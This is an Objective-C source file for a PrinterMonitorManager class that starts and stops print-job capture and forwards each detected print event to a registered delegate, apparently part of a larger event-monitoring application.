//
//  PrinterMonitorManager.m
//  PrinterMonitorManager
//
//  Created by ophat on 11/11/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "PrinterMonitorManager.h"
#import "PrinterMonitorNotify.h"

@implementation PrinterMonitorManager
@synthesize mPrinterMonitorNotify;

#pragma mark #Init
-(id) init{
    if (self = [super init]) {
        mPrinterMonitorNotify = [[PrinterMonitorNotify alloc]init];
        [mPrinterMonitorNotify setMDelegate:self];
        [mPrinterMonitorNotify setMSelector:@selector(PrintJobEventDetected:)];
    }
    return self;
}

#pragma mark #Reg/UnReg
- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

#pragma mark #start/stop
-(void) startCapture{
    [mPrinterMonitorNotify startCapture];
}

-(void) stopCapture{
    [mPrinterMonitorNotify stopCapture];
}

#pragma mark #event
- (void) PrintJobEventDetected: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        DLog(@"PrintJobEventDetected event: %@", aEvent);
        [mEventDelegate eventFinished:aEvent];
    }
}

#pragma mark #Destroy
-(void)dealloc {
    [mPrinterMonitorNotify release];
    [super dealloc];
}
@end
